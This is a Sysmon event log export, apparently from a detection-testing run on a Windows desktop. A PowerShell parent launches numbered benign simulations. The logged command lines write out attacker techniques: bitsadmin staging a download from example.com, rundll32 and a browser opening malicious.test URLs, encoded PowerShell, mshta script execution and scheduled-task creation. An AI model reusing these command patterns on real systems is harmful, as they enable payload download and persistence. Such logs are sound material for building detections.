"11/27/2025 11:35:20 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:20.656
ProcessGuid: {3a35410f-92e0-6928-be13-000000000b00}
ProcessId: 6356
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask36 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:20 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:20.601
ProcessGuid: {3a35410f-92e0-6928-bd13-000000000b00}
ProcessId: 15544
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/36 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:20 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:20.002
ProcessGuid: {3a35410f-92de-6928-b813-000000000b00}
ProcessId: 16360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_jcwmkgqp.qfu.ps1
CreationUtcTime: 2025-11-27 18:05:19.998
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:19 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:19.975
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92df-6928-bc13-000000000b00}
TargetProcessId: 9632
TargetImage: <unknown process>
NewThreadId: 10224
StartAddress: 0x00007FF6D88030D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:19 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:19.291
ProcessGuid: {3a35410f-92df-6928-bb13-000000000b00}
ProcessId: 4904
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test36') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:18 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:18.209
ProcessGuid: {3a35410f-92de-6928-b813-000000000b00}
ProcessId: 16360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADUAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:18 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:18.114
ProcessGuid: {3a35410f-92de-6928-b713-000000000b00}
ProcessId: 7056
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:18 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:18.018
ProcessGuid: {3a35410f-92de-6928-b513-000000000b00}
ProcessId: 4044
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job35 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:17 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:17.948
ProcessGuid: {3a35410f-92dd-6928-b413-000000000b00}
ProcessId: 7100
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92dd-6928-b013-000000000b00}
ParentProcessId: 15732
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/35
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:17 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:17.859
ProcessGuid: {3a35410f-92dd-6928-b213-000000000b00}
ProcessId: 16224
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job35 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:17 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:17.767
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask35
CreationUtcTime: 2025-11-27 18:05:17.767
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:17 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:17.709
ProcessGuid: {3a35410f-92dd-6928-b013-000000000b00}
ProcessId: 15732
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/35
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92dc-6928-a813-000000000b00}
ParentProcessId: 16284
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/35 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:17 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:17.690
ProcessGuid: {3a35410f-92dd-6928-af13-000000000b00}
ProcessId: 7124
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job35 http://example.com/file.exe C:\Temp\file35.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:16 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:16.641
ProcessGuid: {3a35410f-92dc-6928-ad13-000000000b00}
ProcessId: 15728
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job35 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:16 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:16.557
ProcessGuid: {3a35410f-92dc-6928-aa13-000000000b00}
ProcessId: 5388
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask35 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:16 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:16.514
ProcessGuid: {3a35410f-92dc-6928-a913-000000000b00}
ProcessId: 12664
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask35 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:16 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:16.471
ProcessGuid: {3a35410f-92dc-6928-a813-000000000b00}
ProcessId: 16284
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/35 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:16 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:16.214
ProcessGuid: {3a35410f-92da-6928-a213-000000000b00}
ProcessId: 15576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_nkywkh5t.m3x.ps1
CreationUtcTime: 2025-11-27 18:05:16.214
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:15 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:15.209
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92db-6928-a713-000000000b00}
TargetProcessId: 13360
TargetImage: <unknown process>
NewThreadId: 4588
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:15 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:15.168
ProcessGuid: {3a35410f-92db-6928-a613-000000000b00}
ProcessId: 15968
Image: C:\Windows\System32\SecurityHealthHost.exe
FileVersion: 4.18.1907.16384 (WinBuild.160101.0800)
Description: Windows Security Health Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SecurityHealthHost.exe
CommandLine: C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=BC84EF67269A2AEF02EBA5AA8FB69BEC,SHA256=08C05285CE0BA345A39C08D70D6686706CDCB847A220A1CA34F5BFECC8CD8857,IMPHASH=4E28FDA241BEFA94F219E0683850258F
ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00}
ParentProcessId: 848
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.978
ProcessGuid: {3a35410f-92da-6928-a513-000000000b00}
ProcessId: 12860
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test35') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.364
ProcessGuid: {3a35410f-92da-6928-a213-000000000b00}
ProcessId: 15576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADQAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.364
ProcessGuid: {3a35410f-92da-6928-a113-000000000b00}
ProcessId: 15724
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92da-6928-9e13-000000000b00}
ParentProcessId: 15404
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/34
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.251
ProcessGuid: {3a35410f-92da-6928-a013-000000000b00}
ProcessId: 13856
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:14 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:14.159
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask34
CreationUtcTime: 2025-11-27 18:05:14.159
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.084
ProcessGuid: {3a35410f-92da-6928-9e13-000000000b00}
ProcessId: 15404
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/34
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
